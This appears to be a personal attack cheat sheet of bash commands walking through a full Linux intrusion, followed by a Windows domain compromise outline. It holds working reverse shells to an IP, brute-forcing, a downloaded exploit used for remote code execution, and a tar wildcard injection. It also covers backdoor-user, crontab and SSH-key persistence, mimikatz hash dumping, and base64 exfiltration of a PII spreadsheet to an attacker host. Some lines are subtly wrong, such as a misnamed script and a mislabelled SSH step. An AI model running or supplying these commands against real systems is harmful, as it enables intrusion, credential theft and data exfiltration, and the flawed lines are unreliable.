```bash
# scanning
nmap -sSV -p- -Pn -n -O $target
# directory bruteforce
gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# bruteforcing login page
hydra -L users.txt -P passwords.txt $target http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid password"
# known directory traversal exploit to read /etc/passwd unsucessful 
wget -O exploit.sh https://www.exploit-db.com/raw/50406
echo $target > targets.txt
bash explit.sh targets.txt /etc/passwd
# so he tries RCE which results in shell
bash explit.sh targets.txt /bin/sh id

# reverse shell
nc -lvnp 4444
bash exploit.sh targets.txt /bin/sh "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.42.198 4444 > /tmp/f"

# upgrade shell
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
user@remote:~$ ^Z
user@local:~$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
user@local:~$ echo $TERM
user@local:~$ echo $SHELL
user@local:~$ stty raw -echo; fg  #JUST IN CASE, YOUR SHELL IS zsh!!!! OTHERWISE USE THERE COMMANDS SEPARATELY!
user@remote:~$ stty rows ROWS cols COLS

user@remote:~$ export TERM=xterm-256color # the response from previous `echo $TERM`
user@remote:~$ export SHELL=bash # same with `echo $SHELL`
exec /bin/bash # reload bash to apply the TERM variable

# linpeas
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# linenum
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

# Bruteforce ssh 
hydra -L users.txt -P passwords.txt $target http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid password"

#! cronjob
nc -lvnp 1337
echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc '$target' 1337 > /tmp/f' > /usr/local/apache2/htdocs/exploit.sh
chmod +x /usr/local/apache2/htdocs/exploit.sh
echo '' > /usr/local/apache2/htdocs/'--checkpoint=1'
echo '' > /usr/local/apache2/htdocs/'--checkpoint-action=exec=sh exploit.sh'

#! mysql dump
mysqldump -u root webapp | gzip > /var/backups/database_$(date +\%F).sql.gz

#! information exfiltration

#! persistence (new user with ssh key, backdoor, cronjob)
```bash
useradd -m -s /bin/bash backdoor
echo 'backdoor:password123' | chpasswd
usermod -aG backdoor
echo "* * * * * root bash -i >& /dev/tcp/attacker-ip/4444 0>&1" >> /etc/crontab
mkdir -p /root/.ssh
echo "attacker-public-key" >> /root/.ssh/authorized_keys

#! edit the webfiles
```

### WINDOWS

WKSTN -> DC
———————-
Phish CEO (domain admin) -> weak svc privesc -> run keys persistence -> psexec lateral movement DC (uz si admin na DC) -> mimikatz hashdump
Phish CEO (domain admin) -> psexec lateral movement DC (uz si admin na DC) -> mimikatz hashdump
Phish CEO (domain admin) -> psexec lateral movement DC (uz si admin na DC) -> run keys persistence -> mimikatz hashdump

--> https://github.com/peass-ng/PEASS-ng, https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/ (fileless), process injection, file exfiltration (pii_udaje.xlsx > Compress-Archive > base64 > IWR > randomip/exfil?data=<base64>) 

randomip = digital ocean / apt group ip
